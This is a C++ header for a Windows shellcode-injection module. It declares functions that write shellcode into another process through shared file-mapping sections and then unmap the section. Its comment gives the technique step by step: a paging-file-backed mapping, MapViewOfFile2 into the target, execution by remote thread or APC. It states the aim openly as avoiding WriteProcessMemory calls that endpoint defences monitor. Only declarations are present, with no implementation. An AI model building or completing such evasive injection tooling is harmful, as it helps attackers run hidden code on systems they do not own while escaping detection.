#pragma once

#include <windows.h>

// File Mapping Injection (2025 technique)
//
// Instead of using VirtualAllocEx + WriteProcessMemory (heavily monitored by EDRs),
// this uses shared file mapping sections:
// 1. CreateFileMapping with paging-file backing (no disk file)
// 2. MapViewOfFile locally, write shellcode
// 3. MapViewOfFile2 into the target process
// 4. Execute via any trigger (remote thread, APC, etc.)
//
// The key advantage: no WriteProcessMemory call ever occurs.

namespace FileMapInject {

// Inject shellcode into a target process via shared file mapping.
// Returns true if successful. *ppRemoteAddr receives the address in the target.
bool InjectViaFileMapping(HANDLE hProcess, const void* shellcode,
                          size_t shellcodeSize, void** ppRemoteAddr);

// Clean up a previously mapped section in the target process.
bool UnmapRemoteSection(HANDLE hProcess, void* pRemoteAddr);

} // namespace FileMapInject
